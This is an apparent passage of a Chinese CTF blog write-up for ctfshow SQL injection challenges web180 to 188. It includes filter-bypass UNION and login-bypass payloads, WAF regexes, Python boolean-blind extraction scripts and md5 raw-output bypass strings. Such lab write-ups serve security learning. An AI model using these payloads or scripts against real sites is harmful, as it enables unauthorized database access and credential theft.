class="string">&#x27;%0cunion%0cselect%0c1,(select%0cgroup_concat(table_name)%0cfrom%0cinformation_schema.tables%0cwhere%0ctable_schema=&#x27;</span>ctfshow_web<span class="string">&#x27;),&#x27;</span><span class="number">3</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241211183627791.png" alt="image-20241211183627791"></p><p>爆列名</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;%0cunion%0cselect%0c1,(select%0cgroup_concat(column_name)%0cfrom%0cinformation_schema.columns%0cwhere%0ctable_name=&#x27;</span>ctfshow_user<span class="string">&#x27;),&#x27;</span><span class="number">3</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241211184327384.png" alt="image-20241211184327384"></p><p>爆数据(由于重开了环境flag不同了)</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;%0cunion%0cselect%0c1,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername=&#x27;</span>flag<span class="string">&#x27;),&#x27;</span><span class="number">3</span></span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241211185206356.png" alt="image-20241211185206356"></p><hr><h3 id="补充-burpsuite-Fuzzing"><a href="#补充-burpsuite-Fuzzing" class="headerlink" title="补充:burpsuite Fuzzing"></a>补充:burpsuite Fuzzing</h3><p>看蒙师傅博客看到了一种找过滤字符的方法，通过bp攻击来找到过滤字符</p><p>首先下载爆破字典Fuzzdb:<a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a></p><p>然后bp抓包在id位置加变量</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241211193144746.png" alt="image-20241211193144746"></p><p>导入刚才下载的文件进行攻击</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fuzzdb-master\attack\sql-injection\detect\xplatform.txt</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241211193346100.png" alt="image-20241211193346100"></p><p>通过返回包长度来判断哪些字符被过滤</p><h2 id="web181-过滤空格"><a href="#web181-过滤空格" class="headerlink" title="web181(过滤空格)"></a>web181(过滤空格)</h2><p>根据该题目返回逻辑中可知对输入字符进行了过滤</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241211193919230.png" alt="image-20241211193919230"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/|\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>,<span class="variable">$str</span>); &#125;</span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(a,b)表示在b中查找a，如果匹配上则返回<span class="number">1</span>(匹配成功)，否则返回<span class="number">0</span></span><br><span class="line"> ：匹配空格字符。</span><br><span class="line">\*：匹配星号字符（*），在正则表达式中需要转义。</span><br><span class="line">\x09：匹配水平制表符（Tab）。</span><br><span class="line">\x0a：匹配换行符（LF）。</span><br><span class="line">\x0b：匹配垂直制表符。</span><br><span class="line">\x0c：匹配换页符。</span><br><span class="line">\x00：匹配空字符（<span class="literal">NULL</span>）。</span><br><span class="line">\x0d：匹配回车符（CR）。</span><br><span class="line">\xa0：匹配不间断空格。</span><br><span class="line">\x23：匹配井号（<span class="comment">#），在正则表达式中需要转义。</span></span><br><span class="line">\<span class="comment">#：匹配井号（#），这里使用了反斜杠进行转义。</span></span><br><span class="line">file：匹配文本“file”。</span><br><span class="line">into：匹配文本“into”。</span><br><span class="line">select：匹配文本“select”。</span><br></pre></td></tr></table></figure><p>(做题时候没有思路，感觉都被禁完了，去看了wp和蒙师傅博客才知道%0c其实没有被禁，还是要自己多尝试)</p><p>既然%0c没有过滤,那就可以用万能密码直接做出来</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;%0cor%0c1=1--%0c</span></span><br><span class="line"><span class="string">注意万能密码写法，第一次写成1&#x27;</span><span class="operator">%</span><span class="number">0</span>cor1<span class="operator">=</span><span class="number">1</span><span class="comment">--%0c报错，or和1之间应该有空格</span></span><br><span class="line">也可写成以下形式</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;%0cor&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27;--%0c</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="operator">%</span><span class="number">0</span>cor<span class="operator">%</span><span class="number">0</span>c1<span class="operator">=</span><span class="number">1</span><span class="comment">--%01(%01为一个控制字符，用在特殊文件开头，可用来当注释符)</span></span><br><span class="line">看wp也有不用万能密码，直接使用查找</span><br><span class="line"><span class="string">&#x27;or(username)=&#x27;</span>flag</span><br><span class="line"><span class="number">9999</span><span class="string">&#x27;or`username`=&#x27;</span>flag</span><br><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27;||username=&#x27;</span>flag</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241211195936425.png" alt="image-20241211195936425"></p><h2 id="web182-过滤-flag"><a href="#web182-过滤-flag" class="headerlink" title="web182(过滤+flag)"></a>web182(过滤+flag)</h2><p>先分析传入参数过滤逻辑</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br><span class="line">比上一题多过滤一个flag，那最后那几个直接查找的就不行了，试试万能密码</span><br></pre></td></tr></table></figure><p>经过测试和上题一样未过滤%0c,由此万能密码<code>1&#39;%0cor%0c1=1--%0c</code>注入</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241211201250481.png" alt="image-20241211201250481"></p><h2 id="web183-POST布尔盲注"><a href="#web183-POST布尔盲注" class="headerlink" title="web183(POST布尔盲注)"></a>web183(POST布尔盲注)</h2><p>首先发现该题没有搜索框了，重新查看查询语句发现需要post传参tableName</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241211201732571.png" alt="image-20241211201732571"></p><p>根据返回逻辑判断过滤参数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> ：匹配空格字符。</span><br><span class="line">\*：匹配星号字符（*），需要转义。</span><br><span class="line">\x09：匹配水平制表符（Tab）。</span><br><span class="line">\x0a：匹配换行符（LF）。</span><br><span class="line">\x0b：匹配垂直制表符。</span><br><span class="line">\x0c：匹配换页符。</span><br><span class="line">\x0d：匹配回车符（CR）。</span><br><span class="line">\xa0：匹配不间断空格。</span><br><span class="line">\x00：匹配空字符（<span class="literal">NULL</span>）。</span><br><span class="line">\<span class="comment">#：匹配井号（#），需要转义。</span></span><br><span class="line">\x23：匹配井号（<span class="comment">#），需要转义。</span></span><br><span class="line">\=：匹配等号（=），需要转义。</span><br><span class="line"><span class="keyword">or</span>：匹配文本“<span class="keyword">or</span>”。</span><br><span class="line">\x7c：匹配竖线（|），需要转义。</span><br><span class="line">select：匹配文本“select”。</span><br><span class="line"><span class="keyword">and</span>：匹配文本“<span class="keyword">and</span>”。</span><br><span class="line">flag：匹配文本“flag”。</span><br><span class="line">into：匹配文本“into”。</span><br></pre></td></tr></table></figure><p>该题的逻辑就是post向tableName传表名，通过返回的表中记录总数多少来进行布尔盲注</p><p>先传参为ctfshow_user，为可用表名，再从里面跑脚本爆数据</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241211204714635.png" alt="image-20241211204714635"></p><p>使用蒙师傅脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://48fa3a20-1717-4446-b1f5-706654acf25b.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">strlist = <span class="string">&#x27;&#123;&#125;0123456789-abdcefghijklmnopqrstuvwxyz_&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="comment">#对 flag 按位匹配</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;`ctfshow_user`where`pass`like&#x27;ctfshow&#123;&#125;%&#x27;&quot;</span>.<span class="built_in">format</span>(flag+i)</span><br><span class="line">        &#125;</span><br><span class="line">        respond = requests.post(url, data=data)  <span class="comment"># 获取页面代码</span></span><br><span class="line">        respond = respond.text  <span class="comment"># 解析成字符串类型</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;user_count = 1&#x27;</span> <span class="keyword">in</span> respond:  <span class="comment"># 匹配到正确的 flag</span></span><br><span class="line">            flag += i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;ctfshow&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:<span class="built_in">print</span>(<span class="string">&#x27;===================&#x27;</span>+i+<span class="string">&#x27;错误&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        exit()   <span class="comment">#判断 flag 是否获取完整</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ctfshow&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(flag))</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241211204728712.png" alt="image-20241211204728712"></p><h2 id="web184-POST布尔盲注"><a href="#web184-POST布尔盲注" class="headerlink" title="web184(POST布尔盲注)"></a>web184(POST布尔盲注)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function waf($str)&#123;</span><br><span class="line">   return preg_match(&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;, $str);</span><br><span class="line"> &#125;</span><br><span class="line">发现sleep，`也被禁了，说明上一题也可以用时间盲注出结果，不过这一题依旧布尔盲注</span><br></pre></td></tr></table></figure><p>ctfshow_user为可用表名</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241211205305164.png" alt="image-20241211205305164"></p><p>看了wp里一个师傅的对上题代码进行修改，成功获得flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url = <span class="string">&#x27;http://d9d9f822-405c-457e-abc9-bdb088661e6c.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">strlist = <span class="string">&#x27;&#123;0123456789-abcdefghijklmnopqrstuvwxyz&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">c=<span class="string">&#x27;&#x27;</span> <span class="comment">#新建c来存储最终flag</span></span><br><span class="line">d=<span class="string">&#x27;&#x27;</span> <span class="comment">#新建d来存储十六进制数</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">     <span class="comment">#对 flag 按位匹配</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">        d =<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]  <span class="comment">#获得去除0x的十六进制数，ord函数将字符转为ASCII值，hex函数将ASCII值按16进制表示，[2:]表示切除0x</span></span><br><span class="line">        data = &#123; <span class="string">&#x27;tableName&#x27;</span>:<span class="string">&quot;ctfshow_user group by pass having pass regexp(0x&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(flag+d) &#125;  <span class="comment">#在ctfshow_user表中，根据pass字段的值进行分组，并筛选出那些pass字段值匹配特定十六进制表示的字符串的记录</span></span><br><span class="line">        respond = requests.post(url, data=data)  <span class="comment"># 获取页面代码</span></span><br><span class="line">        respond = respond.text  <span class="comment"># 解析成字符串类型</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;user_count = 1&#x27;</span> <span class="keyword">in</span> respond:  <span class="comment"># 匹配到正确的 flag</span></span><br><span class="line">            flag += d</span><br><span class="line">            c+=i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;ctfshow&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(c))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> c[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        exit()   <span class="comment">#判断 flag 是否获取完整</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ctfshow&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(c))</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241212151608907.png" alt="image-20241212151608907"></p><h2 id="web185-布尔盲注过滤0-9"><a href="#web185-布尔盲注过滤0-9" class="headerlink" title="web185(布尔盲注过滤0-9)"></a>web185(布尔盲注过滤0-9)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br><span class="line">\*：匹配星号（*）字符。</span><br><span class="line">\x09：匹配水平制表符（Tab）。</span><br><span class="line">\x0a：匹配换行符（New Line）。</span><br><span class="line">\x0b：匹配垂直制表符。</span><br><span class="line">\x0c：匹配换页符。</span><br><span class="line">\<span class="number">0x0d</span>：匹配回车符（Carriage Return）。</span><br><span class="line">\xa0：匹配不换行空格（Non-breaking Space）。</span><br><span class="line">\x00：匹配空字符（Null Byte）。</span><br><span class="line"><span class="comment">#：匹配井号（#）。</span></span><br><span class="line">\x23：匹配井号（<span class="comment">#），等同于#。</span></span><br><span class="line">[<span class="number">0</span>-<span class="number">9</span>]：匹配任何数字。</span><br><span class="line">file：匹配字符串“file”。</span><br><span class="line">=：匹配等号（=）。</span><br><span class="line"><span class="keyword">or</span>：匹配字符串“<span class="keyword">or</span>”。</span><br><span class="line">\x7c：匹配竖线（Pipe）字符。</span><br><span class="line">select：匹配字符串“select”。</span><br><span class="line"><span class="keyword">and</span>：匹配字符串“<span class="keyword">and</span>”。</span><br><span class="line">flag：匹配字符串“flag”。</span><br><span class="line">into：匹配字符串“into”。</span><br><span class="line">where：匹配字符串“where”。</span><br><span class="line">&amp;：匹配和号（Ampersand）。</span><br><span class="line">\<span class="string">&#x27; 和 \&quot;：分别匹配单引号和双引号。</span></span><br><span class="line"><span class="string">union：匹配字符串“union”。</span></span><br><span class="line"><span class="string">```：匹配反引号（Backtick），MySQL中用于标识标识符。</span></span><br><span class="line"><span class="string">sleep：匹配字符串“sleep”。</span></span><br><span class="line"><span class="string">benchmark：匹配字符串“benchmark”。</span></span><br></pre></td></tr></table></figure><p>这个题对数字0-9进行过滤，因此像上一个题一样用十六进制转换不能成功，贴一个师傅的脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creatNum</span>(<span class="params">n</span>): <span class="comment"># 3 = true + true + true</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">str</span> += <span class="string">&quot;true&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">str</span> += <span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creatStr</span>(<span class="params"><span class="built_in">str</span></span>): <span class="comment"># 将&#x27;23&#x27;变成 char(true+true),char(true+true+true)</span></span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(<span class="built_in">str</span>)+<span class="number">1</span>):</span><br><span class="line">        temp = <span class="built_in">ord</span>(<span class="built_in">str</span>[i-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">            res = <span class="string">&quot;chr(&quot;</span> + creatNum(temp) + <span class="string">&quot;)&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res += <span class="string">&quot;,&quot;</span> + <span class="string">&quot;chr(&quot;</span> + creatNum(temp) + <span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f1273616-5765-47ae-bb82-0a287117cb02.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">letters = letter = <span class="string">r&quot;&#123;0123456789abcdefg-&#125;hijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> letters:</span><br><span class="line">        result = creatStr(flag + ch)</span><br><span class="line">        data = &#123;<span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user group by pass having pass regexp(concat(&#123;&#125;))&quot;</span>.<span class="built_in">format</span>(result)&#125;</span><br><span class="line">        res = requests.post(url = url, data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += ch</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="comment"># if ch == &#x27;&#125;&#x27;: </span></span><br><span class="line">            <span class="comment">#     exit()</span></span><br><span class="line">            <span class="keyword">break</span> <span class="comment"># 寻找下一个位置</span></span><br></pre></td></tr></table></figure><p>主要是通过将传入数字,字母和符号转换为true+true的形式，类似于自增，实现绕过0-9限制，运行得到结果</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241218122808164.png" alt="image-20241218122808164"></p><h2 id="web186-布尔盲注过滤引号"><a href="#web186-布尔盲注过滤引号" class="headerlink" title="web186(布尔盲注过滤引号)"></a>web186(布尔盲注过滤引号)</h2><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241218123945352.png" alt="image-20241218123945352"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">\*：星号，用于匹配任何字符。</span><br><span class="line">\x09、\x0a、\x0b、\x0c、\x0d：分别代表制表符、换行符、回车符、换页符、回车符。</span><br><span class="line">\xa0：不间断空格。</span><br><span class="line">\%：百分号，用于匹配SQL语句中的通配符。</span><br><span class="line">|：管道符，用于匹配SQL语句中的逻辑或。</span><br><span class="line">&lt;、&gt;：小于、大于符号，用于匹配HTML标签。</span><br><span class="line">\^：脱字符，用于匹配SQL语句中的逻辑非。</span><br><span class="line">\x00：空字符。</span><br><span class="line">\<span class="comment">#：井号，用于匹配注释。</span></span><br><span class="line">[<span class="number">0</span>-<span class="number">9</span>]：数字，用于匹配数字类型的注入。</span><br><span class="line">file：文件操作相关的关键词。</span><br><span class="line">=：等号，用于匹配赋值操作。</span><br><span class="line"><span class="keyword">or</span>、<span class="keyword">and</span>：逻辑运算符。</span><br><span class="line">\x7c：竖线，用于匹配SQL语句中的逻辑或。</span><br><span class="line">select、<span class="keyword">and</span>、flag、into、where：SQL语句中的关键词。</span><br><span class="line">\x26：和符号，用于匹配逻辑与。</span><br><span class="line"><span class="string">&#x27;、&quot;：单引号和双引号，用于匹配SQL注入中的引号。</span></span><br><span class="line"><span class="string">union：SQL语句中的联合查询关键词。</span></span><br><span class="line"><span class="string">``：反引号，用于匹配MySQL中的表名或列名。</span></span><br><span class="line"><span class="string">sleep、benchmark：SQL函数，用于时间盲注攻击。</span></span><br></pre></td></tr></table></figure><p>发现依旧没过滤上题脚本中的字符，因此可继续使用上题脚本获得flag</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241218124339461.png" alt="image-20241218124339461"></p><h2 id="web187-MD5函数绕过"><a href="#web187-MD5函数绕过" class="headerlink" title="web187(MD5函数绕过)"></a>web187(MD5函数绕过)</h2><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241218131321123.png" alt="image-20241218131321123"></p><p>换题型了，该题目含义也就是限定username为admin，通过password传参来实现</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line">关键代码，实现了post传入的password参数以<span class="number">16</span>字符的二进制形式返回，如果使得返回<span class="string">&#x27;or&#x27;</span><span class="number">1</span>(不为<span class="number">0</span>开头的任何数)就能使查询语句拼接为 password= <span class="string">&#x27;&#x27;</span><span class="keyword">or</span><span class="string">&#x27;1(真)&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="补充-php中md5-函数"><a href="#补充-php中md5-函数" class="headerlink" title="补充:php中md5()函数"></a>补充:php中md5()函数</h3><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="keyword">string</span>,<span class="literal">true</span>/<span class="literal">false</span>/空)</span><br><span class="line"><span class="keyword">string</span>为必需字符串</span><br><span class="line">若第二个变量为<span class="literal">true</span>，会输出原始<span class="number">16</span>字符二进制格式;为<span class="literal">false</span>，会输出<span class="number">32</span>字符十六进制数(默认)</span><br></pre></td></tr></table></figure><h4 id="强弱比较及绕过"><a href="#强弱比较及绕过" class="headerlink" title="强弱比较及绕过"></a>强弱比较及绕过</h4><p><strong>强比较(&#x3D;&#x3D;&#x3D;):先比较类型再比较值</strong></p><p><strong>弱比较(&#x3D;&#x3D;):先将类型转换再比较值，比如字符串与数字比较则先将字符串转换为数字再进行比较</strong></p><p>以下为常见绕过方法(MD5函数中均进行运算再计算MD5值)</p><h5 id="1-0e绕过-科学计数法绕过"><a href="#1-0e绕过-科学计数法绕过" class="headerlink" title="1.0e绕过(科学计数法绕过)"></a>1.0e绕过(科学计数法绕过)</h5><p>以0e开头的数运算后均为0</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241218142152287.png" alt="image-20241218142152287"></p><p>变式:字符串若计算MD5值后为0e开头，则该值会被计算为0，比如题目(md5(a)&#x3D;&#x3D;0)，则可通过传入QNKCDZO等绕过</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241218142658437.png" alt="image-20241218142658437"></p><h5 id="2-数组绕过"><a href="#2-数组绕过" class="headerlink" title="2.数组绕过"></a>2.数组绕过</h5><p>md5函数不能处理数组，因此处理数组时，都会返回null，因此在强比较时传入数组会使值相等，GET传参时可使用a[]&#x3D;1&amp;b[]&#x3D;2来使两个值相等</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241218143238456.png" alt="image-20241218143238456"></p><h5 id="3-运算配合类型转换绕过"><a href="#3-运算配合类型转换绕过" class="headerlink" title="3.运算配合类型转换绕过"></a>3.运算配合类型转换绕过</h5><p>md5() 遇到运算符，会先运算，再计算结果的MD5值。</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241218143443257.png" alt="image-20241218143443257"></p><p>当字符串与数字类型运算时，会将字符串转换成数字类型，再参与运算，最后计算运算结果的MD5值。</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241218143606903.png" alt="image-20241218143606903"></p><h5 id="4-类型转换绕过"><a href="#4-类型转换绕过" class="headerlink" title="4.类型转换绕过"></a>4.类型转换绕过</h5><p>虽然 md5() 要求传入字符串，但传入整数或小数也不会报错；数字相同时，数值型和字符串的计算结果是相同的。</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241218143707092.png" alt="image-20241218143707092"></p><h4 id="注意-MD5常见密码"><a href="#注意-MD5常见密码" class="headerlink" title="注意:MD5常见密码"></a>注意:MD5常见密码</h4><p>字符型:<strong>ffifdyop</strong></p><p>数字型:<strong>129581926211651571912466741651878684928</strong></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241218133855143.png" alt="image-20241218133855143"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241218133927618.png" alt="image-20241218133927618"></p><p>因此这里选择字符型密码，bp抓包重发获得flag</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20241218134113239.png" alt="image-20241218134113239"></p><h2 id="web188-MD5弱比较"><a href="#web188-MD5弱比较" class="headerlink" title="web188(MD5弱比较)"></a>web188(MD5弱比较)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用户名检测</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">  